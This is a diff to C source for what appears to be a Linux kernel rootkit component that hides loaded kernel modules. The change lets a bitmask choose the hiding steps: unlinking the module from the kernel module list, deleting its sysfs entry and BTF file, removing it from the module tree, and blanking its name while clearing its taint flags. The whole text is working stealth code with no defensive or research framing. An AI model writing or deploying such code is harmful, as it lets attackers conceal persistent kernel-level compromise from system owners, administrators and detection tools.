@@ -26,7 +26,7 @@ struct hm_ctx {
 	struct work_struct hide_work;
 	struct hm_obj objs[HM_OBJ_MAX];
 	size_t num_objs;
-	bool clear_fields;
+	unsigned long actions;
 	bool hidden;
 };
 
@@ -66,16 +66,17 @@ static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 	if (!anchor)
 		return -ENOENT;
 
-	list_del_rcu(&mod->list);
-	synchronize_rcu();
-
-	kobject_del(&mod->mkobj.kobj);
-	hm_del_btf_file(ctx, mod);
-
-	if (ctx->fn_tree_remove)
+	if (ctx->actions & HM_ACT_LIST) {
+		list_del_rcu(&mod->list);
+		synchronize_rcu();
+	}
+	if (ctx->actions & HM_ACT_SYSFS)
+		kobject_del(&mod->mkobj.kobj);
+	if (ctx->actions & HM_ACT_BTF)
+		hm_del_btf_file(ctx, mod);
+	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_remove)
 		((hm_mod_tree_fn)ctx->fn_tree_remove)(mod);
-
-	if (ctx->clear_fields) {
+	if ((ctx->actions & HM_ACT_FIELDS) && mod->name[0]) {
 		memset(mod->name, 0, strlen(mod->name));
 		mod->state = MODULE_STATE_LIVE;
 		mod->taints = 0;
@@ -88,10 +89,10 @@ static void hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 	struct module *mod = obj->u.mod;
 	struct list_head *anchor;
 
-	if (ctx->fn_tree_insert)
+	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_insert)
 		((hm_mod_tree_fn)ctx->fn_tree_insert)(mod);
 	anchor = obj->anchor ? obj->anchor : ctx->anchor_modules;
-	if (anchor && list_empty(&mod->list))
+	if ((ctx->actions & HM_ACT_LIST) && anchor && list_empty(&mod->list))
 		list_add(&mod->list, anchor);
 }
 
@@ -143,6 +144,7 @@ int hm_init(const struct hm_resolver *res)
 		return -EINVAL;
 	memset(&ctx_st, 0, sizeof(ctx_st));
 	ctx_st.res = res;
+	ctx_st.actions = HM_ACT_USER;
 	INIT_WORK(&ctx_st.hide_work, hm_hide_work);
 	return hm_resolve_ctx(&ctx_st);
 }
@@ -219,9 +221,9 @@ void hm_clear_objs(void)
 	ctx_st.num_objs = 0;
 }
 
-void hm_set_clear_fields(bool en)
+void hm_set_actions(unsigned long mask)
 {
-	ctx_st.clear_fields = en;
+	ctx_st.actions = mask;
 }
 
 int hm_hide(void)
